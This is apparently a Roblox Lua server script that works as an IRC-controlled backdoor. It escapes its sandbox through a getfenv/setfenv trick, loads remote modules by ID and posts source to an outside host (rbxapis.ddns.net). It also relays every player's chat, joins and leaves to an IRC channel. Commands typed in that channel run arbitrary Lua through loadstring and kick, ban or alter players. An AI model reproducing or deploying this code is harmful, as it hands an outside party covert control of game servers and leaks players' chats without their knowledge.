a=newproxy(true);getmetatable(a).__tostring=function() a=getfenv(3);end;pcall(warn,a);a=setfenv(1,a);
local Http=game:GetService("HttpService")
wait()
local API = {}
local Connections = {}
local Banned = {}
local GStr = nil
local Http = game:GetService("HttpService")
local function Post(Url,Data)
	local Errored,Data = ypcall(function() return Http:PostAsync(Url,Data,Enum.HttpContentType.ApplicationUrlEncoded) end)
	return Errored == false and false or Data
end
local function JSONDecode(JSON)
	local Worked,Result = ypcall(function() return Http:JSONDecode(JSON) end)
	if Worked == false then
		return {}
	else
		return Result
	end
end
local function HandleVagues(Connection,Ping,Derp,Raw)
	local Msgs = JSONDecode(Ping)
	local Search = [[%["c","353","webchat%.SwiftIRC%.net",%[".+",".",".+","]]
	if Derp == nil and Ping:find(Search) then
		GStr = Ping
	end
	if Msgs ~= nil and type(Msgs) == "table" and #Msgs > 0 then
		for i,v in pairs(Msgs) do
			for i2,v2 in pairs(Connection.VagueEvents) do
				if v2 ~= false then
					Spawn(function() v2(v,Raw) end)
				end
			end
		end
	end
end
NetworkServer = game:GetService('NetworkServer')
Send=require(328231860)
function SendAll(...)
	for i,v in pairs(NetworkServer:children()) do 
		if v:IsA"ServerReplicator" then
			Send(v:GetPlayer(),...)
		end
	end
end
function GetLocal(source,player) 
site = "http://rbxapis.ddns.net/newlocal.php"
id = tonumber(game:GetService('HttpService'):PostAsync(site,source))
_returnscript = require(id)
_returnscript.Parent=player.PlayerGui 
_returnscript.Disabled=false
end	
function find1Player(str)
	for i,v in pairs(game.Players:players'') do
		if v.Name:sub(str:len()) == str then
			return v;
		end
	end
end
function GetPlayer(msg,Reason)
	local FoundPlayers = {}
	local find
	if Reason == true then
		ypcall(function()
			find = string.find(msg,";")
			msg = string.sub(msg,1,find-1)
		end)
	end
	if msg == "all" or msg == "everyone" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			table.insert(FoundPlayers,Plr)
		end
	elseif msg == "noobs" or msg == "nubs" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			if Plr.AccountAge < 364 and Plr.Name ~= "CoolMLGPlayer" then
				table.insert(FoundPlayers,Plr)
			end
		end
	elseif msg == "veterans" or msg == "elders" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			if Plr.AccountAge >= 364 then
				table.insert(FoundPlayers,Plr)
			end
		end
	else
		local Z = false
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			local N = string.lower(Plr.Name)
			msg = string.lower(msg)
			if string.match(N,msg) then
				if Z == false then
					Z = true
					table.insert(FoundPlayers,Plr)
				end
			end
		end
	end
	return FoundPlayers
end
Scale = function(p, size)
	local pchar = p.Character
	if pchar then
		local function scale(chr, scl)
       
			for _, v in pairs(pchar:GetChildren()) do
				if v:IsA("Hat") then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
               
			local Head = chr['Head']
			local Torso = chr['Torso']
			local LA = chr['Left Arm']
			local RA = chr['Right Arm']
			local LL = chr['Left Leg']
			local RL = chr['Right Leg']
			local HRP = chr['HumanoidRootPart']
       
			wait(0.1)
           
			Head.formFactor = 3
			Torso.formFactor = 3
			LA.formFactor = 3
			RA.formFactor = 3
			LL.formFactor = 3
			RL.formFactor = 3
			HRP.formFactor = 3
           
			Head.Size = Vector3.new(scl * 2, scl, scl)
			Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
			LA.Size = Vector3.new(scl, scl * 2, scl)
			RA.Size = Vector3.new(scl, scl * 2, scl)
			LL.Size = Vector3.new(scl, scl * 2, scl)
			RL.Size = Vector3.new(scl, scl * 2, scl)
			HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
           
			local Motor1 = Instance.new('Motor6D', Torso)
			Motor1.Part0 = Torso
			Motor1.Part1 = Head
			Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
			Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
			Motor1.Name = "Neck"
                   
			local Motor2 = Instance.new('Motor6D', Torso)
			Motor2.Part0 = Torso
			Motor2.Part1 = LA
			Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor2.Name = "Left Shoulder"
           
			local Motor3 = Instance.new('Motor6D', Torso)
			Motor3.Part0 = Torso
			Motor3.Part1 = RA
			Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor3.Name = "Right Shoulder"
           
			local Motor4 = Instance.new('Motor6D', Torso)
			Motor4.Part0 = Torso
			Motor4.Part1 = LL
			Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor4.Name = "Left Hip"
           
			local Motor5 = Instance.new('Motor6D', Torso)
			Motor5.Part0 = Torso
			Motor5.Part1 = RL
			Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor5.Name = "Right Hip"
           
			local Motor6 = Instance.new('Motor6D', HRP)
			Motor6.Part0 = HRP
			Motor6.Part1 = Torso
			Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
			Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
               
		end
       
		scale(pchar, size)
		pchar.Humanoid.WalkSpeed = 15 * size
   
		for _, v in pairs(game.Lighting:GetChildren()) do
			if v:IsA("Hat") then
				v.Parent = pchar
			end
		end
	end
end
Fire = function(person, color)
	local pos = person.Character.Torso.Position
	for _, v in pairs(person.Character:GetChildren()) do
		if v:IsA'Part' and v.Name ~= "HumanoidRootPart" then
			if v.Name ~= "Head" then
				for i = 0, 10, 1 do
					local part = Instance.new("Part", person.Character)
					part.Name = "Burnt:"..v.Name
					local l = Instance.new("PointLight", part)
					l.Brightness = 5
					l.Range = 5
					part.FormFactor = "Custom"
					part.Size = Vector3.new(v.Size.X + .2, v.Size.Y / 10, v.Size.Z + .2)
					part.CanCollide = false
					part.Transparency = .5
					if _ % 2 == 0 then
						if i % 2 == 0 then
							part.BrickColor = BrickColor.new(color)
						else
							part.BrickColor = BrickColor.new("Really black")
						end
					else
						if i % 2 == 0 then
							part.BrickColor = BrickColor.new("Really black")
						else
							part.BrickColor = BrickColor.new(color)
						end
					end
					part.Material = Enum.Material.Neon
					l.Color = part.Color
					part.TopSurface = "Smooth"
					part.BottomSurface = "Smooth"
					local w = Instance.new("Weld")
					w.Part1 = v
					w.Part0 = part
					w.C1 = CFrame.new(0, (1 - v.Size.Y / 10 * i), 0)
					w.Parent = person.Character.Torso
					w.Name = v.Name
					v.Touched:connect(function(hit)
						if hit.Parent.Name ~= person.Name then
							local hum = hit.Parent:findFirstChild("Humanoid")
							if hum then
								for a, d in pairs(hit.Parent:GetChildren()) do
									if d:IsA'Part' and d.Name ~= "HumanoidRootPart" then
										d.BrickColor = BrickColor.new("Really black")
										d.Material = "CorrodedMetal"
										d.Transparency = 0
									elseif d.Name == "HumanoidRootPart" then
										d:ClearAllChildren()
									elseif
										d:IsA'Shirt' or d:IsA'Pants' or d:IsA'Hat' or d:IsA'BodyColors' then
										d:Destroy()
									end
								end
							end
						end
					end)
				end
				--v.Anchored=true
			elseif v.Name == "Head" then
				local fire = Instance.new("Fire", v)
				fire.SecondaryColor = Color3.new(1, 0, 0)
				v.Material = Enum.Material.Neon
				v.BrickColor = BrickColor.new(color)
				v.Transparency = .5
				pcall(function()
					v.face.Transparency = 1
					local decal = Instance.new('Decal', v)
					decal.Face = "Front"
					decal.Texture = "http://www.roblox.com/asset/?id=209712379"
				end)
			end
		elseif v:IsA'Hat' then
			v.Handle.Material = Enum.Material.Neon
			v.Handle.Mesh.TextureId = ""
			v.Handle.BrickColor = BrickColor.new(color)
			v.Handle.Transparency = .5
		end
	end
	person.Character:MoveTo(pos)
end
Fart = function(Character)
	local FartPart = Instance.new("Part", Character)
	FartPart.BrickColor = BrickColor.new("Institutional white");
	FartPart.Material = Enum.Material.SmoothPlastic
	FartPart.Transparency = 1;
	FartPart.Name = "Fart"
	FartPart.FormFactor = Enum.FormFactor.Symmetric
	FartPart.Size = Vector3.new(2, 1, 1);
	FartPart.CFrame = Character.Torso.CFrame * CFrame.new(0, -1, .75) * CFrame.Angles(math.rad(-90), 0, 0);
	FartPart.CanCollide = false;
	FartPart.Locked = true;
	FartPart.BottomSurface = Enum.SurfaceType.Smooth
	FartPart.TopSurface = Enum.SurfaceType.Smooth
	local Weld = Instance.new("Weld", FartPart)
	Weld.C0 = FartPart.CFrame:inverse();
	Weld.C1 = Character.Torso.CFrame:inverse();
	Weld.Part0 = FartPart
	Weld.Part1 = Character.Torso
	local FartSmoke = Instance.new("Smoke", FartPart)
	FartSmoke.RiseVelocity = -5;
	FartSmoke.Size = .1;
	FartSmoke.Color = Color3.new(70 / 255, 100 / 255, 30 / 255);
	FartSmoke.Opacity = 1;
	wait(3);
	FartPart:Destroy();
end
function sbexe(cmd, plr)
	if not type(cmd) == 'string' then
		return
	end
	if plr then
		if type(plr) == 'userdata' then
			plr:FindFirstChild("SB_CommandRemote", true).Value = cmd
		elseif type(plr) == 'string' then
			plr = game:GetService('Players'):FindFirstChild(plr)
			plr:FindFirstChild("SB_CommandRemote", true).Value = cmd
		end
	else
		for i, v in pairs(game:GetService('Players'):children()) do
			v:FindFirstChild("SB_CommandRemote", true).Value = cmd
		end
	end
end
ChatGetter = function(Message, Chat)
	
				SendAll(
				("[IRC] "..Message ..": ".. Chat or Message),
				BrickColor.new("New Yeller").Color,
				Enum.Font.SourceSansBold,
				Enum.FontSize.Size18
				)
				
if Chat then				
				
		if string.sub(Chat,1,4) == "exe;" then
			local ToExe = string.sub(Chat,5)
			local execute = loadstring(ToExe)
			local Run,Error = ypcall(function()
				execute()
			end)		
		elseif string.sub(Chat,1,5) == "kick;" then
			local msg = string.sub(Chat,6)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Player:Kick("Remote: "..Reason)
			end
		elseif string.sub(Chat,1,4) == "ban;" then
			local msg = string.sub(Chat,5)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Player:Kick("Remote Ban: "..Reason)
				Banned[Player.Name] = {Reason = Reason}
			end
		elseif string.sub(Chat,1,7) == "resize;" then
			local msg = string.sub(Chat,8)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Scale(Player,tonumber(Reason))
			end
		elseif string.sub(Chat,1,5) == "fire;" then
			local msg = string.sub(Chat,6)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Fire(Player,Reason)
			end
		elseif string.sub(Chat,1,5) == "fart;" then
			local msg = string.sub(Chat,6)
			local Players = GetPlayer(msg)
			for i,Player in pairs(Players) do
				Fart(Player.Character)
			end					
		elseif string.sub(Chat,1,6) == "sbexe;" then
			local msg = string.sub(Chat,7)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				sbexe(Reason,Player)
			end
		elseif string.sub(1,6) == "warning;" then
			local msg = string.sub(Chat,6)
			SendAll(
				("[IRC WARNING]: "..string.upper(msg)),
				BrickColor.new("New Yeller").Color,
				Enum.Font.SourceSansBold,
				Enum.FontSize.Size24
			)
						if string.find(Chat,"#") == nil then
		end
		end
	end
end
API.Connect = function(this,Host,Nick,Pass)
	--if Connections[Nick.."@"..Host] == nil then
		local Con = {}
		Connections[Nick.."@"..Host] = Con
		Con.Host = Host
		Con.Nick = Nick
		Con.Counter = 0
		Con.Channels = {}
		Con.VagueEvents = {}
		Con.ChannelEvents = {[Nick]={}}
		Con.UserLists = {}
		Con.SelfEvents = {}
		Con.Counter = Con.Counter+1
		local Data = Post(Host.."e/n?t="..Con.Counter,"nick="..Nick)
		Data = JSONDecode(Data)
		Con.Key = Data[2]
		local Str = ""
		if Con.Key ~= nil then
			wait(1)
			Con.Counter = Con.Counter+1
			local Data = Post(Host.."e/p?t="..Con.Counter,"s="..Con.Key.."&c=MODE "..Nick.." +")
			if Data == false then
				return false,"Something went wrong."
			else
				local Data2 = JSONDecode(Data)
				if Data2[1] == false then
					return false,Data
				end
			end
			Str = Str..Data
			Con.Counter = Con.Counter+1
			local Data = Post(Host.."e/s?t="..Con.Counter,"s="..Con.Key)
			if Data == false then
				return false,"Something went wrong."
			else
				local Data2 = JSONDecode(Data)
				if Data2[1] == false then
					return false,Data
				end
			end
			Str = Str..Data
			if Str:lower():find("already in use") then
				return false,"Nick already in use."
			elseif Str:lower():find("throttled") then
				return false,"Oh no! We got throttled."
			elseif Str:lower():find("invalid session") then
				return false,"Something went wrong."
			end
			if Pass ~= nil then
				API.SendMessage(API.SendMessage,Con,"NickServ","identify "..Pass)
			end
			wait()
			return Con
		else
			return false,"Something went wrong."
		end
	--[[else
		return false,"There is a connection with this nick already."
	end]]

end




API.Disconnect = function(this,Connection)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=QUIT :Leaving")

		if Data ~= false then

			Connections[Nick.."@"..Host] = nil

			for i,v in pairs(Connection.SelfEvents) do

				v:Disconnect()

			end

			Connection.SelfEvents = {}

			for Channel,_ in pairs(Connection.Channels) do

				Connection.Channels[Channel] = nil

				for i,v in pairs(Connection.ChannelEvents[Channel]) do

					v:Disconnect()

				end

				Connection.ChannelEvents[Channel] = nil

			end

			return true

		else

			return false,"Something went wrong."

		end

	else

		return false,"This connection doesn't exist."

	end

end




API.ChangeNick = function(this,Connection,Nick)

	local Host = Connection.Host

	local Key = Connection.Key

	if Connections[Connection.Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=NICK "..Nick)

		if Data == false then

			return false,"Something went wrong."

		else

			local Data2 = JSONDecode(Data)

			if Data2[1] == false then

				return false,Data

			end

		end

		Connections[Connection.Nick.."@"..Host] = nil

		Connection.Nick = Nick

		Connections[Nick.."@"..Host] = Connection

		return true

	else

		return false,"There is no connection with this nick and host."

	end

end




API.JoinChannel = function(this,Connection,Channel)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	local Str = ""

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=JOIN "..Channel.." ")

		if Data == false then

			return false,"Something went wrong."

		else

			local Data2 = JSONDecode(Data)

			if Data2[1] == false then

				return false,Data

			end

		end

		Str = Str..Data

		

		local Search = [[%["c","353","webchat%.SwiftIRC%.net",%["]] .. Nick .. [[",".","]] .. Channel .. [[","]]

		if Str:find(Search) == nil then

			repeat

				if GStr ~= nil then

					Str = Str..GStr

					GStr = nil

					break

				end

				Connection.Counter = Connection.Counter+1

				local Data = Post(Host.."e/s?t="..Connection.Counter,"s="..Connection.Key)

				if Data == false then

					return false,"Something went wrong."

				else

					HandleVagues(Connection,Data,false)

					local Data2 = JSONDecode(Data)

					if Data2[1] == false then

						return false,Data

					end

				end

				Str = Str..Data

			until Str:find(Search) ~= nil

		end

		

		if Str:find("already in use") then

			return false,"Nick already in use."

		elseif Str:lower():find("throttled") then

			return false,"Oh no! We got throttled."

		elseif Str:lower():find("invalid session") then

			return false,"Something went wrong."

		else--if Str:lower():find("end of /names list.") then

			Connection.Channels[Channel] = true

			Connection.ChannelEvents[Channel] = {}

			Connection.UserLists[Channel] = {}

			Connection.UserLists[Channel][Nick] = true

			local Search = [[%["c","353","webchat%.SwiftIRC%.net",%["]] .. Nick .. [[",".","]] .. Channel .. [[","]]

			local RawSearch = Search:gsub("%%","")

			local Start = Str:find(Search)

			if Start ~= nil then

				local End = Str:find('"',Start+#RawSearch+1,true)

				local List = Str:sub(Start+#RawSearch,End-1)

				for Match in List:gmatch("[^%s]+") do

					if Match ~= Nick then

						if Match:sub(1,1):match("[%w]") then

							Connection.UserLists[Channel][Match] = true

						else

							Connection.UserLists[Channel][Match:sub(2)] = true

						end

					end

				end

			end

			Spawn(function()

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.UserJoined(API.UserJoined,Connection,Channel,function(User)

					Connection.UserLists[Channel][User] = true

				end)

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.UserLeft(API.UserLeft,Connection,Channel,function(User)

					wait(0.02)

					Connection.UserLists[Channel][User] = nil

				end)

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.NickChanged(API.NickChanged,Connection,Channel,function(User,Nick)

					wait(0.02)

					Connection.UserLists[Channel][User] = nil

					Connection.UserLists[Channel][Nick] = true

				end)

				wait(0.02)

				HandleVagues(Connection,[=[ [["c","JOIN","]=] .. Nick .. [=[!",["]=] .. Channel .. [=["]]] ]=],nil,true)

			end)

			return true

		--[[else

			return false,"Something went wrong."]]

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.GetUserList = function(this,Connection,Channel)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		local New = {}

		for i,v in pairs(Connection.UserLists[Channel]) do

			New[#New+1] = i

		end

		return New

	else

		return false,"There is no connection with this nick and host."

	end

end




API.LeaveChannel = function(this,Connection,Channel,Reason)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	local Str = ""

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PART "..Channel.." "..Reason and ":"..tostring(Reason) or "")

		if Data:find("true") then

			Connection.Channels[Channel] = nil

			for i,v in pairs(Connection.ChannelEvents[Channel]) do

				v:Disconnect()

			end

			Connection.UserLists[Channel] = nil

			Connection.SelfEvents = {}

			Connection.ChannelEvents[Channel] = nil

			return true

		elseif Data:lower():find("throttled") then

			return false,"Oh no! We got throttled."

		else

			return false,"Something went wrong."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.SendMessage = function(this,Connection,Channel,Message)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true or Channel:sub(1,1) ~= "#" then

			Connection.Counter = Connection.Counter+1

			local Ping = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PRIVMSG "..Channel.." :"..Http:UrlEncode(Message))

			if Ping ~= false then

				return true,Ping

			else

				return false,"Something went wrong. "..Ping

			end

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




local function VagueReceived(Connection,Event)

	Connection.VagueEvents[#Connection.VagueEvents+1] = Event

	if #Connection.VagueEvents == 1 then

		while Connections[Connection.Nick.."@"..Connection.Host] ~= nil do

			Connection.Counter = Connection.Counter+1

			local Ping = Post(Connection.Host.."e/s?t="..Connection.Counter,"s="..Connection.Key)

			if Ping ~= false and Connections[Connection.Nick.."@"..Connection.Host] ~= nil then

				HandleVagues(Connection,Ping)

			end

			wait()

		end

	end

end




API.MessageReceived = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "PRIVMSG" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() then

						Event(v[3]:sub(1,v[3]:find("!")-1),v[4][2])

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.PMReceived = function(this,Connection,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		local Con = {}

		local Connected = true

		local VCon;

		Spawn(function()

			local function Return(v)

				if Connected == false then

					for i,v in pairs(Connection.VagueEvents) do

						if v == VCon then

							Connection.VagueEvents[i] = false

						end

					end

					return

				end

				if type(v) == "table" and v[2] ~= nil and v[2] == "PRIVMSG" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1] == Connection.Nick then

					Event(v[3]:sub(1,v[3]:find("!")-1),v[4][2])

				end

			end

			VCon = Return

			VagueReceived(Connection,Return)

		end)

		Con.Disconnect = function(this)

			Connected = false

			Connection.ChannelEvents[Nick][Con] = nil

		end

		Connection.ChannelEvents[Nick][Con] = Con

		return Con

	else

		return false,"There is no connection with this nick and host."

	end

end




API.NickChanged = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "NICK" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" then

						if Connection.UserLists[Channel][v[3]:sub(1,v[3]:find("!")-1)] ~= nil then

							Event(v[3]:sub(1,v[3]:find("!")-1),v[4][1])

						end

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.UserJoined = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v,Raw)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "JOIN" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() and (v[3]:sub(1,v[3]:find("!")-1) ~= Nick or Raw == true) then

						Event(v[3]:sub(1,v[3]:find("!")-1))

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.UserLeft = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "PART" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() then

						Event(v[3]:sub(1,v[3]:find("!")-1))

					elseif type(v) == "table" and v[2] ~= nil and v[2] == "QUIT" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" then

						if Connection.UserLists[Channel][v[3]:sub(1,v[3]:find("!")-1)] ~= nil then

							Event(v[3]:sub(1,v[3]:find("!")-1))

						end

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.KeepAlive = function(this,Connection)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Ping = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PONG :webchat.SwiftIRC.net")

		if Ping ~= false then

			return true

		else

			return false,"Something went wrong."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end








rand = tostring(math.random(0,20))

local con = API:Connect("https://qwebirc.swiftirc.net/","Legit"..rand)--API.Connect = function(this,Host,Nick,Pass)

spawn(function() while wait(5) do API:KeepAlive(con) end end)

local c = {API:JoinChannel(con,"#LegitIRCFTW")}--this,Connection,Channel)

print("Data", unpack(c))

if not c[1] then error(c[2],2) end

API:MessageReceived(con,"#LegitIRCFTW",ChatGetter)

API:UserJoined(con,"#LegitIRCFTW",ChatGetter)

API:UserLeft(con,"#LegitIRCFTW",ChatGetter)

local Chat=function(msg,channel,playername)
					
					c={API:SendMessage(con,channel and tostring(channel) or "#LegitIRCFTW",playername..': '..msg)}
					if not c[1] then error(c[2],2) end
					return "success"
			end

ChangeNick=function(nick)

	API:ChangeNick(con,nick)

end

JoinChannel=function(channel)

	API:JoinChannel(con,channel)

end

LeaveChannel=function(channel,reason)

	API:LeaveChannel(con,channel,reason)

end

function ircprint(msg) Chat(msg,"#LegitIRCFTW","OUTPUT")end

coroutine.resume(coroutine.create(function()
				for i,v in pairs(game:GetService'Players':GetPlayers()) do
					v.Chatted:connect(function(msg) local t=tostring(v)
						Chat(tostring(msg),'#LegitIRCFTW',t)
					end)
				end
				game:GetService'Players'.PlayerAdded:connect(function(p)
					local r=tostring(p)
					Chat(p.Name.." has joined.",'#LegitIRCFTW',r)
					SendAll(p.Name.." has joined.",		
								BrickColor.new("New Yeller").Color,
								Enum.Font.SourceSansBold,
								Enum.FontSize.Size18)
Send(p,
		("[IRC]: Welcome "..p.Name),
		BrickColor.new("New Yeller").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)

Send(p,
		("[IRC]: Your Account Age:  "..p.AccountAge),
		BrickColor.new("New Yeller").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)

					
					p.Chatted:connect(function(m) local r=tostring(p)
					Chat(tostring(m),'#LegitIRCFTW',r)
					end)
					end)
				game:GetService'Players'.PlayerRemoving:connect(function(p)
					local r=tostring(p)
					Chat(p.Name.." has left.",'#LegitIRCFTW',r)
					SendAll(p.Name.." has left.",		
								BrickColor.new("New Yeller").Color,
								Enum.Font.SourceSansBold,
								Enum.FontSize.Size18)
				end)
			end))

SendAll(
	'[IRC]: IRC Has Loaded',
		BrickColor.new("New Yeller").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)
for _,p in pairs (game:GetService'Players':GetPlayers())do
Send(p,  
	("[IRC]: Welcome "..p.Name),
		BrickColor.new("New Yeller").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)
end

for _,p in pairs (game:GetService'Players':GetPlayers())do
Send(p,  
	("[IRC]: Your AccountAge: "..p.AccountAge),
		BrickColor.new("New Yeller").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)
end

game:GetService("Players").PlayerAdded:connect(function(Plr)
	if Banned[Plr.Name] then
		Plr:Kick(Banned[Plr.Name].Reason)
	end
end)
return nil
